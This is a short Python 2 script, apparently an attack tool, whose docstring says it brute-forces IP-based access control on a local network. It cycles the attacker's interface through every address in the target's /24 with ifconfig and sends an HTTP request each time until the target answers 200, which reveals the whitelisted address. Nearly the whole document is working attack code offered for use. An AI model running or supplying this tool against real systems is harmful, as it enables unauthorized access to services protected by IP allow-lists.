#!/usr/bin/python

# AUTHOR TAHARDJEBBAR Abdellah seddik
# Mail : Abdellahseddikpro@gmail.com 

''' This a free software that is use to brute-force a target(the target must be on your local network )if he is using an IP-based ACL That allow a single host with a pre  defined  IP address to connect to the target, principle is is the host machine (attacker) keep changing the IP address of his machine then send an http request to the target '''

import os, sys, httplib , time 
interface = str(sys.argv[1])
url="/"+str(sys.argv[2]).split('/',1)[1]
target= str(sys.argv[2]).split('/')[0]
network= target.split('.')

for i in range(1,254):
	try: 
		os.system('ifconfig %s %s.%s.%s.%d netmask 255.255.255.0'%(interface,network[0],network[1],network[2],i))
		conn = httplib.HTTPConnection(target,timeout=10)
		conn.request("GET", url)
		response = conn.getresponse()
		if response.status==200:
			print "The right ip is %s.%s.%s.%d" %(network[0],network[1],network[2],i)
			break
	except:
		pass


os.system('ifconfig %s down'    %interface)
time.sleep(5)
os.system('ifconfig %s up'    %interface)
	




